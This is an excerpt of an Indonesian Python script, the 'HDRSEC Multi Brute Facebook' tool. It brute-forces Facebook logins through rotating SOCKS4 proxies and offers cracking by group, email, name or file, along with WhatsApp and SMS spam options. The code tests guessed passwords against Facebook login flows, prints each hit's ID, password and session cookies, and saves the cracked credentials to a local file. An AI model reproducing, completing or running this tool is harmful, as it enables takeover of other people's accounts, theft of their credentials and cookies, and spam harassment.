# [+] Update By HDRSEC17 And All
# [+] Script Free Jangan Di Perjual Belikan Ya
# [+] Donasi Untuk HDRSEC17 
# [+] Dana : 089635781831
...
from concurrent.futures import ThreadPoolExecutor as HDRSEC17 
...
sys.stdout.write('\x1b]2; HMBF | HDRSEC Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari HDRSEC17');exit()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							os.system("xdg-open https://chat.whatsapp.com/D2pOrczXy8y32aN9uIPz28")
							print("\n [+] Login Berhasil | python HDRSEC17.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , BrayennnXD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	...
	_____HDRSEC___17____ = input(f' [+] Pilih Menu Crack : ')
	if _____HDRSEC___17____ in ['1','01']:
		HDRSEC_dump()
	elif _____HDRSEC___17____ in ['2','02']:
		dump_massal()
	elif _____HDRSEC___17____ in ['3','03']:
		crack_group()
	elif _____HDRSEC___17____ in ['4','04']:
		crack_email()
	elif _____HDRSEC___17____ in ['5','05']:
		crack_file()
	elif _____HDRSEC___17____ in ['6','06']:
		crack_nama()
	elif _____HDRSEC___17____ in ['7','07']:
		pengikut()
	elif _____HDRSEC___17____ in ['8','08']:
		komen()
	elif _____HDRSEC___17____ in ['9','09']:
		file_cp()
	elif _____HDRSEC___17____ in ['10']:
		result()
	elif _____HDRSEC___17____ in ['11']:
		siu()
	elif _____HDRSEC___17____ in ['12']:
		spam_wa()
	elif _____HDRSEC___17____ in ['13']:
		spam_sms()
	elif _____HDRSEC___17____ in ['14']:
		dumpid()
	elif _____HDRSEC___17____ in ['15']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='HDRSEC17-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='HDRSEC17-OK')
					cetak(statusok1)
		...
		try:
			...
			if "User must verify their account" in post.text:
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='HDRESC17-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
